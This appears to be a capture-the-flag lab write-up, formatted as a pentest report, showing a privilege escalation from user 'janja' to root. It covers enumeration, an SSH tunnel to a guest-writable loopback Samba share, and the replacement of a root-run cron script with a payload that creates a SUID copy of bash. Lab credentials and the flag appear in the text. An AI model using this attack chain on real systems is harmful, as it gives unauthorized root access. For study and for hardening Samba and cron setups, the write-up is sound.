# Silence – Pentest Report - Local Privilege Escalation via Samba and Root Cron

## 1. Initial User Access

The first part of the room provided SSH access as the user `janja`.

```bash
ssh janja@10.10.0.36

Username: janja
Password: theClimbingMonster

sudo -l

Sorry, user janja may not run sudo on climbing.
```

## 2. SUID and Capability Enumeration

SUID binaries were enumerated:

```bash
find / -perm -4000 -type f 2>/dev/null

/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/sudo
/usr/sbin/exim4
```

Linux capabilities were also checked:

```bash
getcap -r / 2>/dev/null
```

No useful capabilities were identified.

## 3. Cron Enumeration

The system-wide crontab and `/etc/cron.d` were inspected:

```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

A custom cron file was discovered:

```bash
/etc/cron.d/adam
```

Its content was:

```bash
cat /etc/cron.d/adam

* * * * * root /home/adam/checklist.sh
```

This showed that `/home/adam/checklist.sh` was executed by `root` every minute.

## 4. Access Restrictions on Adam's Home Directory

Direct access to the script was denied:

```bash
ls -l /home/adam/checklist.sh
cat /home/adam/checklist.sh

Permission denied
```

The directory permissions were inspected:

```bash
namei -l /home/adam/checklist.sh

drwx------ adam adam adam
                      checklist.sh - Permission denied
```

The directory `/home/adam` was therefore inaccessible directly to `janja`.

## 5. Local Service Enumeration

Running processes were inspected:

```bash
ps -eo user,pid,ppid,cmd --forest
```

The cron execution was visible:

```bash
root ... /usr/sbin/CRON
root ... /bin/sh -c /home/adam/checklist.sh
root ... /bin/sh /home/adam/checklist.sh
root ... sleep 10
```

Listening ports were then enumerated:

```bash
ss -lntup

127.0.0.1:445
```

A Samba service was listening only on the loopback interface.

## 6. Samba Configuration Enumeration

The Samba configuration was inspected:

```bash
grep -vE '^[[:space:]]*(#|;|$)' /etc/samba/smb.conf
```

Result:

```bash
[global]
   workgroup = WORKGROUP
   server role = standalone server
   bind interfaces only = yes
   interfaces = lo
   smb ports = 445

[Adam home dir]
   path = /home/adam
   read only = no
   force user = adam
   guest ok = yes
   writable = yes
   browseable = yes
```

The effective configuration was confirmed with:

```bash
testparm -s 2>/dev/null
```

The share exposed `/home/adam`, allowed guest access, and allowed write operations while forcing operations to run as `adam`.

## 7. SSH Port Forwarding

Because Samba listened only on `127.0.0.1:445` on the target, an SSH local port forward was created from the attacker WSL machine:

```bash
ssh -fN -L 1445:127.0.0.1:445 janja@10.10.0.36
```

Parameters:

- `-L 1445:127.0.0.1:445`: forwards local TCP port `1445` to the target's local SMB port `445`.
- `-N`: does not start a remote shell.
- `-f`: moves the SSH tunnel to the background after authentication.

This made the target's local Samba service reachable through:

```bash
127.0.0.1:1445
```

## 8. Anonymous Samba Access

The Samba share was accessed anonymously:

```bash
smbclient "//127.0.0.1/Adam home dir" -p 1445 -N
```

Parameters:

- `-p 1445`: connects through the SSH-forwarded port.
- `-N`: performs an anonymous connection without a password.

The connection succeeded:

```bash
Anonymous login successful

ls

.bashrc
.profile
.bash_logout
checklist.sh
```

The cron script was downloaded:

```bash
get checklist.sh
```

## 9. Analysis of the Root-Executed Script

The downloaded script was inspected locally:

```bash
cat checklist.sh
```

Content:

```bash
echo "Checking if all the supplies are ready for the hike..."
ls -alh /home/adam
sleep 10
echo "Testing superhuman grip strength with one finger pull-ups"
finger 2> /dev/null
sleep 10
echo "Verifying that no one can execute this checklist"
chmod 766 /home/adam/checklist.sh
sleep 10
echo "OK, this should be fine, let's go to Flathanger!"
```

Because the Samba share was writable and the script was executed by `root` every minute, replacing `checklist.sh` allowed arbitrary commands to be executed with root privileges.

## 10. Root Cron Exploitation

The original script was backed up:

```bash
cp checklist.sh checklist.sh.original
```

It was then replaced locally with:

```bash
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
```

The malicious version was uploaded back to the Samba share:

```bash
smbclient "//127.0.0.1/Adam home dir" -p 1445 -N
```

Inside `smbclient`:

```bash
put checklist.sh
exit
```

At the next cron execution, `root` executed the modified script.

The resulting file was verified:

```bash
ls -l /tmp/rootbash

-rwsr-xr-x 1 root root 1298416 Aug 28 14:12 /tmp/rootbash
```

The `s` in the owner's execute position confirms that the SUID bit was set.

## 11. Root Shell

The SUID copy of Bash was executed while preserving its effective privileges:

```bash
/tmp/rootbash -p
```

Parameters:

- `-p`: preserves the effective privileged identity instead of dropping it.

Privileges were verified:

```bash
id

uid=1002(janja) gid=1002(janja) euid=0(root) groups=1002(janja)
```

The effective user ID was `0`, giving root privileges.

## 12. Root Flag

The root flag was read using its absolute path:

```bash
cat /root/root.txt

EPI{4D4m_0nDr4_51L3nC3_7H3_h4RD357_r0u73_3V3r_9c}
```

## Attack Path Summary

```text
SSH access as janja
        ↓
Local privilege enumeration
        ↓
Discovery of /etc/cron.d/adam
        ↓
root executes /home/adam/checklist.sh every minute
        ↓
/home/adam inaccessible directly to janja
        ↓
Samba discovered on localhost:445
        ↓
Samba share exposes /home/adam
        ↓
guest ok = yes + writable = yes + force user = adam
        ↓
SSH port forwarding to local SMB service
        ↓
Anonymous access with smbclient
        ↓
checklist.sh replaced through writable Samba share
        ↓
root cron executes modified script
        ↓
SUID root copy of /bin/bash created
        ↓
/tmp/rootbash -p
        ↓
euid=0(root)
        ↓
/root/root.txt
```

## Main Security Issues Identified

- A cron job executed a script from `/home/adam` as `root` every minute.
- The same directory was exposed through Samba.
- The Samba share allowed unauthenticated guest access.
- The Samba share was writable.
- Samba forced guest operations to execute as the user `adam`.
- A root-executed script could therefore be replaced by an unauthenticated SMB client.
- This created a direct local privilege escalation path from `janja` to `root`.
